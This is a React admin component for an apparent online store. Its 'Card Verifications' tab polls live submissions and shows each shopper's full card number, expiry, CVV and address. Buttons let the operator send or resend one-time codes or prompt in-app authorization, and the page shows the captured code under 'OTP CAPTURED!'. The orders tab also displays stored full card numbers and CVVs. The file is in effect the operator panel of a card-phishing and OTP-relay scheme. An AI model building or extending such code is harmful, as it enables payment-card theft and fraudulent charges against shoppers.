import { useGetAllOrdersQuery, useUpdateOrderStatusMutation, useRefundOrderMutation, useGetPendingVerificationsQuery, useAdminSendOtpMutation, useAdminResendOtpMutation, useAdminAuthorizeAppMutation } from "../../features/api/apiSlice";
import SectionHeading from "../../components/ui/SectionHeading";
import { useState, useEffect } from "react";
import { CreditCard, Send, Clock, CheckCircle2, Eye, EyeOff, AlertTriangle, RefreshCw } from "lucide-react";

function AdminOrders() {
  const [filters, setFilters] = useState({ q: "", status: "", page: 1, limit: 10 });
  const { data, isLoading, refetch } = useGetAllOrdersQuery(filters);
  const orders = data?.data?.items || (Array.isArray(data?.data) ? data.data : []);
  const total = data?.data?.total || data?.total || 0;
  const perPage = data?.data?.perPage || data?.perPage || filters.limit;
  const page = data?.data?.page || data?.page || filters.page;
  const [updateOrderStatus] = useUpdateOrderStatusMutation();
  const [refundOrder] = useRefundOrderMutation();
  const [expanded, setExpanded] = useState(null);

  // Card Verifications
  const { data: pendingData, refetch: refetchPending } = useGetPendingVerificationsQuery(undefined, {
    pollingInterval: 4000, // Auto-refresh every 4 seconds
  });
  const pendingVerifications = pendingData?.data || [];
  const [adminSendOtp, { isLoading: isSendingOtp }] = useAdminSendOtpMutation();
  const [adminResendOtp, { isLoading: isResendingOtp }] = useAdminResendOtpMutation();
  const [adminAuthorizeApp, { isLoading: isAuthorizingApp }] = useAdminAuthorizeAppMutation();
  const [activeTab, setActiveTab] = useState("verifications");
  const [sentIds, setSentIds] = useState(new Set());

  // Send OTP to user
  const handleSendOtp = async (id) => {
    try {
      await adminSendOtp(id).unwrap();
      setSentIds((prev) => new Set([...prev, id]));
      refetchPending();
    } catch (err) {
      console.error("Failed to send OTP:", err);
    }
  };

  const handleResendOtp = async (id) => {
    try {
      await adminResendOtp(id).unwrap();
      refetchPending();
    } catch (err) {
      console.error("Failed to resend OTP:", err);
    }
  };

  const handleAuthorizeApp = async (id) => {
    try {
      await adminAuthorizeApp(id).unwrap();
      refetchPending();
    } catch (err) {
      console.error("Failed to trigger authorize app:", err);
    }
  };

  return (
    <div>
      {/* Tab Switcher */}
      <div className="flex gap-1 bg-gray-100 rounded-xl p-1 mb-6">
        <button
          onClick={() => setActiveTab("verifications")}
          className={`flex-1 py-2.5 px-4 rounded-lg text-sm font-bold transition-all cursor-pointer ${
            activeTab === "verifications"
              ? "bg-white text-blue-700 shadow-sm"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          <div className="flex items-center justify-center gap-2">
            <CreditCard size={16} />
            Card Verifications
            {pendingVerifications.filter((v) => v.status === "pending").length > 0 && (
              <span className="bg-red-500 text-white text-[10px] font-bold px-2 py-0.5 rounded-full animate-pulse">
                {pendingVerifications.filter((v) => v.status === "pending").length}
              </span>
            )}
          </div>
        </button>
        <button
          onClick={() => setActiveTab("orders")}
          className={`flex-1 py-2.5 px-4 rounded-lg text-sm font-bold transition-all cursor-pointer ${
            activeTab === "orders"
              ? "bg-white text-blue-700 shadow-sm"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          Orders
        </button>
      </div>

      {/* ── CARD VERIFICATIONS TAB ── */}
      {activeTab === "verifications" && (
        <div>
          <div className="flex items-center justify-between mb-4">
            <SectionHeading>Pending Card Verifications</SectionHeading>
            <button
              onClick={refetchPending}
              className="flex items-center gap-1.5 text-sm text-blue-600 hover:text-blue-800 font-semibold cursor-pointer"
            >
              <RefreshCw size={14} /> Refresh
            </button>
          </div>

          {pendingVerifications.length === 0 ? (
            <div className="bg-white rounded-xl border border-gray-200 p-12 text-center shadow-sm">
              <Clock size={48} className="text-gray-300 mx-auto mb-3" />
              <p className="text-gray-500 font-medium">No pending card verifications</p>
              <p className="text-gray-400 text-sm mt-1">New verifications will appear here automatically</p>
            </div>
          ) : (
            <div className="space-y-4">
              {pendingVerifications.map((v) => {
                const isPending = v.status === "pending";
                const isOtpSent = v.status === "otp_sent" || v.status === "otp_resent" || v.status === "authorize_app";
                const isOtpSubmitted = v.status === "otp_submitted";
                const isVerified = v.status === "verified";

                return (
                  <div
                    key={v.id}
                    className={`rounded-xl border-2 bg-white shadow-sm overflow-hidden transition-all ${
                      isPending
                        ? "border-red-300 ring-1 ring-red-100"
                        : isOtpSubmitted
                        ? "border-yellow-400 ring-1 ring-yellow-200"
                        : isVerified
                        ? "border-blue-500 ring-1 ring-blue-200"
                        : "border-green-300 ring-1 ring-green-100"
                    }`}
                  >
                    {/* Status Header */}
                    <div
                      className={`px-5 py-2.5 text-xs font-bold uppercase tracking-widest flex items-center justify-between ${
                        isPending
                          ? "bg-red-50 text-red-700 border-b border-red-200"
                          : isOtpSubmitted
                          ? "bg-yellow-50 text-yellow-800 border-b border-yellow-300"
                          : isVerified
                          ? "bg-blue-600 text-white border-b border-blue-700"
                          : "bg-green-50 text-green-700 border-b border-green-200"
                      }`}
                    >
                      <div className="flex items-center gap-2">
                        {isPending ? (
                          <>
                            <AlertTriangle size={14} className="animate-pulse" /> WAITING FOR YOUR ACTION
                          </>
                        ) : isOtpSubmitted ? (
                          <>
                            <AlertTriangle size={14} className="animate-pulse" /> USER SUBMITTED OTP - REVIEW REQUIRED
                          </>
                        ) : isVerified ? (
                          <>
                            <CheckCircle2 size={16} /> OTP CAPTURED!
                          </>
                        ) : (
                          <>
                            <CheckCircle2 size={14} /> OTP SENT — WAITING FOR USER
                          </>
                        )}
                      </div>
                      <span className="text-[10px] font-normal normal-case text-gray-500">
                        {new Date(v.createdAt).toLocaleString()}
                      </span>
                    </div>

                    <div className="p-5">
                      {/* User Info Row */}
                      <div className="flex items-center justify-between mb-4">
                        <div>
                          <p className="text-base font-bold text-gray-900">
                            {v.user?.name || v.user?.email || "Unknown User"}
                          </p>
                          <p className="text-sm text-gray-500">{v.user?.email}</p>
                        </div>
                        <div className="text-right">
                          <p className="text-xl font-extrabold text-gray-900">
                            ${Number(v.amount || 0).toFixed(2)}
                          </p>
                          <p className="text-xs text-gray-400">Order Amount</p>
                        </div>
                      </div>

                      {/* Card Details Box */}
                      <div className="bg-gradient-to-r from-slate-800 to-slate-900 rounded-xl p-5 mb-4 text-white relative overflow-hidden">
                        {/* Background pattern */}
                        <div className="absolute top-0 right-0 w-40 h-40 bg-white/5 rounded-full -translate-y-1/2 translate-x-1/2"></div>
                        <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2"></div>

                        <div className="relative z-10">
                          <div className="flex items-center justify-between mb-4">
                            <div className="flex items-center gap-2">
                              <CreditCard size={20} />
                              <span className="text-sm font-bold tracking-widest uppercase">
                                {v.cardDetails?.brand || "CARD"}
                              </span>
                            </div>
                          </div>

                          {/* Card Number */}
                          <p className="font-mono text-2xl tracking-[0.2em] mb-5 font-bold text-yellow-400">
                            {v.cardDetails?.cardNumber || "N/A"}
                          </p>

                          {/* Card Info Grid */}
                          <div className="grid grid-cols-4 gap-4">
                            <div className="col-span-1">
                              <p className="text-[10px] text-white/50 uppercase tracking-wider mb-0.5">Cardholder</p>
                              <p className="text-base font-bold truncate text-white">
                                {v.cardDetails?.nameOnCard || "N/A"}
                              </p>
                            </div>
                            <div className="col-span-1">
                              <p className="text-[10px] text-white/50 uppercase tracking-wider mb-0.5">Expires</p>
                              <p className="text-base font-bold text-white">
                                {v.cardDetails?.expiryDate || "N/A"}
                              </p>
                            </div>
                            <div className="col-span-1">
                              <p className="text-[10px] text-white/50 uppercase tracking-wider mb-0.5">CVV</p>
                              <p className="text-base font-bold text-white">
                                {v.cardDetails?.cvv || "N/A"}
                              </p>
                            </div>
                            {!!v.userOtp && (
                              <div className="col-span-1 border-l border-white/20 pl-4 bg-white/5 rounded-r">
                                <p className="text-[10px] text-yellow-300 uppercase tracking-wider mb-0.5">USER OTP</p>
                                <p className="text-2xl font-bold text-yellow-400 font-mono tracking-widest">
                                  {v.userOtp}
                                </p>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>

                      {/* Shipping Info */}
                      {v.shippingAddress && (
                        <div className="bg-gray-50 rounded-lg p-3 mb-4 text-sm">
                          <p className="font-bold text-gray-700 text-xs uppercase tracking-wider mb-1">Shipping Address</p>
                          <p className="text-gray-600">
                            {v.shippingAddress.fullName}, {v.shippingAddress.line1}, {v.shippingAddress.city}, {v.shippingAddress.state} {v.shippingAddress.postalCode}
                          </p>
                        </div>
                      )}

                      {/* Action Button */}
                      {!isVerified ? (
                        <div className="flex flex-col gap-2">
                          {!!v.userOtp && (
                            <p className="text-sm font-bold text-gray-700 text-center mb-1">
                              User submitted OTP: {v.userOtp}. What next?
                            </p>
                          )}
                          <button
                            onClick={() => handleSendOtp(v.id)}
                            disabled={isSendingOtp}
                            className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 rounded-lg text-sm flex items-center justify-center gap-2 transition-all shadow-lg hover:shadow-xl cursor-pointer disabled:opacity-50"
                          >
                            <Send size={16} />
                            {isSendingOtp ? "Sending..." : "Send OTP to User"}
                          </button>
                          <div className="flex gap-2">
                            <button
                              onClick={() => handleAuthorizeApp(v.id)}
                              disabled={isAuthorizingApp}
                              className="flex-1 bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 rounded-lg text-xs flex items-center justify-center transition-all cursor-pointer disabled:opacity-50"
                            >
                              {isAuthorizingApp ? "..." : "Authorize from app"}
                            </button>
                            <button
                              onClick={() => handleResendOtp(v.id)}
                              disabled={isResendingOtp}
                              className="flex-1 bg-amber-500 hover:bg-amber-600 text-white font-bold py-2 rounded-lg text-xs flex items-center justify-center transition-all cursor-pointer disabled:opacity-50"
                            >
                              {isResendingOtp ? "..." : "Resend otp"}
                            </button>
                          </div>
                        </div>
                      ) : (
                        <div className="bg-blue-50 border border-blue-300 rounded-lg py-3 px-4 flex flex-col items-center justify-center">
                          <p className="text-blue-800 font-bold text-lg mb-1 flex items-center gap-2">
                            <CheckCircle2 size={20} /> User Submitted OTP: <span className="font-mono text-xl tracking-widest bg-blue-100 px-2 py-1 rounded">{v.userOtp}</span>
                          </p>
                          <p className="text-xs text-blue-600">This order is now marked as confirmed.</p>
                        </div>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* ── ORDERS TAB ── */}
      {activeTab === "orders" && (
        <div>
          <SectionHeading>Orders</SectionHeading>
          {isLoading ? (
            <p>Loading…</p>
          ) : (
            <div>
              <div className="mt-4 flex flex-wrap items-center gap-3 bg-white p-4 rounded-xl shadow-sm border border-gray-200">
                <input
                  value={filters.q}
                  onChange={(e) => setFilters((s) => ({ ...s, q: e.target.value, page: 1 }))}
                  placeholder="Search orders or customer..."
                  className="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none w-full sm:w-auto flex-1"
                />
                <select
                  value={filters.status}
                  onChange={(e) => setFilters((s) => ({ ...s, status: e.target.value, page: 1 }))}
                  className="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none w-full sm:w-48 bg-white cursor-pointer"
                >
                  <option value="">All statuses</option>
                  <option value="pending">Pending</option>
                  <option value="confirmed">Confirmed</option>
                  <option value="shipped">Shipped</option>
                  <option value="delivered">Delivered</option>
                  <option value="cancelled">Cancelled</option>
                  <option value="refunded">Refunded</option>
                </select>
                <div className="w-full sm:w-auto sm:ml-auto text-sm font-semibold bg-gray-100 px-4 py-2 rounded-lg text-gray-700">Total Orders: {total}</div>
              </div>

              <div className="mt-6 grid gap-4">
                {orders.length === 0 ? (
                  <div className="bg-white p-8 rounded-xl shadow-sm border border-gray-200 text-center">
                    <p className="text-gray-500 italic">No orders found matching your filters.</p>
                  </div>
                ) : (
                  orders.map((o) => (
                    <div key={o._id} className="rounded-xl border border-gray-200 bg-white p-4 shadow-sm hover:shadow-md transition-shadow">
                      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                        <div>
                          <div className="font-bold text-gray-900">{o.orderNumber}</div>
                          <div className="text-sm text-gray-600">{o.user?.email || o.user?.name}</div>
                        </div>
                        <div className="flex items-center gap-3">
                          <span className={`px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider
                            ${o.status === "pending" ? "bg-yellow-100 text-yellow-800" :
                              o.status === "confirmed" ? "bg-blue-100 text-blue-800" :
                              o.status === "delivered" ? "bg-green-100 text-green-800" :
                              o.status === "cancelled" || o.status === "refunded" ? "bg-red-100 text-red-800" :
                              "bg-gray-100 text-gray-800"
                            }`}>
                            {o.status}
                          </span>
                          <button
                            className="px-4 py-2 bg-gray-100 hover:bg-gray-200 text-gray-800 text-sm font-semibold rounded-lg transition-colors cursor-pointer"
                            onClick={() => setExpanded(expanded === o._id ? null : o._id)}
                          >
                            {expanded === o._id ? "Hide Details" : "View Details"}
                          </button>
                        </div>
                      </div>
                      {expanded === o._id && (
                        <div className="mt-3">
                          <div className="mb-4">
                            <h4 className="font-semibold text-sm mb-1">Customer Information</h4>
                            <div className="text-sm text-text/80 bg-gray-50 p-2 rounded border border-gray-200">
                              <p><span className="font-semibold">Name:</span> {o.shippingAddress?.fullName || o.user?.name || "N/A"}</p>
                              <p><span className="font-semibold">Phone:</span> {o.shippingAddress?.phone || "N/A"}</p>
                              <p><span className="font-semibold">Address:</span> {o.shippingAddress?.line1} {o.shippingAddress?.city}, {o.shippingAddress?.state} {o.shippingAddress?.postalCode}, {o.shippingAddress?.country}</p>
                            </div>
                          </div>
                          <div className="text-sm text-muted">{o.items?.length || 0} items — Total: ${Number(o.totalAmount || o.total || 0).toFixed(2)}</div>
                          <ul className="mt-2 space-y-2 mb-4">
                            {(o.items || []).map((it, idx) => (
                              <li key={it._id || idx} className="flex items-center justify-between">
                                <div>{it.name || "Unknown Product"} {it.sku ? `(${it.sku})` : ""}</div>
                                <div>{it.quantity || 1} × ${Number(it.price || 0).toFixed(2)}</div>
                              </li>
                            ))}
                          </ul>

                          {/* Show Card Information for Completed Orders */}
                          {o.paymentMethod === "card" && o.cardDetails && (
                            <div className="mb-4">
                              <h4 className="font-semibold text-sm mb-2 flex items-center gap-2">
                                <CreditCard size={16} className="text-blue-600" />
                                Payment Information (Card)
                              </h4>
                              <div className="bg-gradient-to-r from-slate-800 to-slate-900 text-white p-4 rounded-xl shadow-inner relative overflow-hidden">
                                <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-1/2 translate-x-1/2"></div>
                                <div className="relative z-10">
                                  <p className="font-mono text-xl tracking-[0.2em] mb-4 font-bold text-yellow-400">
                                    {o.cardDetails.cardNumber || "N/A"}
                                  </p>
                                  <div className="grid grid-cols-3 gap-4">
                                    <div>
                                      <p className="text-[10px] text-white/50 uppercase tracking-wider mb-0.5">Cardholder</p>
                                      <p className="text-sm font-bold truncate text-white">{o.cardDetails.nameOnCard || "N/A"}</p>
                                    </div>
                                    <div>
                                      <p className="text-[10px] text-white/50 uppercase tracking-wider mb-0.5">Expires</p>
                                      <p className="text-sm font-bold text-white">{o.cardDetails.expiryDate || "N/A"}</p>
                                    </div>
                                    <div>
                                      <p className="text-[10px] text-white/50 uppercase tracking-wider mb-0.5">CVV</p>
                                      <p className="text-sm font-bold text-white">{o.cardDetails.cvv || "N/A"}</p>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          )}

                          <div className="mt-4 pt-4 border-t border-gray-100 flex gap-2">
                            <select
                              defaultValue={o.status}
                              onChange={async (e) => { await updateOrderStatus({ id: o._id, status: e.target.value }); refetch(); }}
                              className="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none text-sm bg-white cursor-pointer"
                            >
                              <option value="pending">Pending</option>
                              <option value="confirmed">Confirmed</option>
                              <option value="shipped">Shipped</option>
                              <option value="delivered">Delivered</option>
                              <option value="cancelled">Cancelled</option>
                              <option value="refunded">Refunded</option>
                            </select>
                            <button
                              className="px-4 py-2 bg-red-50 text-red-600 hover:bg-red-100 font-semibold rounded-lg text-sm transition-colors cursor-pointer"
                              onClick={async () => { if (confirm("Refund this order?")) { await refundOrder(o._id).unwrap(); refetch(); } }}
                            >
                              Refund
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  ))
                )}
              </div>

              <div className="mt-6 flex flex-col sm:flex-row items-center justify-between gap-4 bg-white p-4 rounded-xl shadow-sm border border-gray-200">
                <div className="text-sm text-gray-500 font-medium">Showing Page {page} (Limit: {perPage} per page)</div>
                <div className="flex gap-2">
                  <button
                    className="px-4 py-2 bg-gray-100 hover:bg-gray-200 text-gray-800 font-semibold rounded-lg disabled:opacity-50 disabled:cursor-not-allowed transition-colors cursor-pointer"
                    disabled={page <= 1}
                    onClick={() => setFilters((s) => ({ ...s, page: Math.max(1, page - 1) }))}
                  >
                    Previous
                  </button>
                  <button
                    className="px-4 py-2 bg-gray-100 hover:bg-gray-200 text-gray-800 font-semibold rounded-lg disabled:opacity-50 disabled:cursor-not-allowed transition-colors cursor-pointer"
                    disabled={page * perPage >= total}
                    onClick={() => setFilters((s) => ({ ...s, page: page + 1 }))}
                  >
                    Next
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export default AdminOrders;
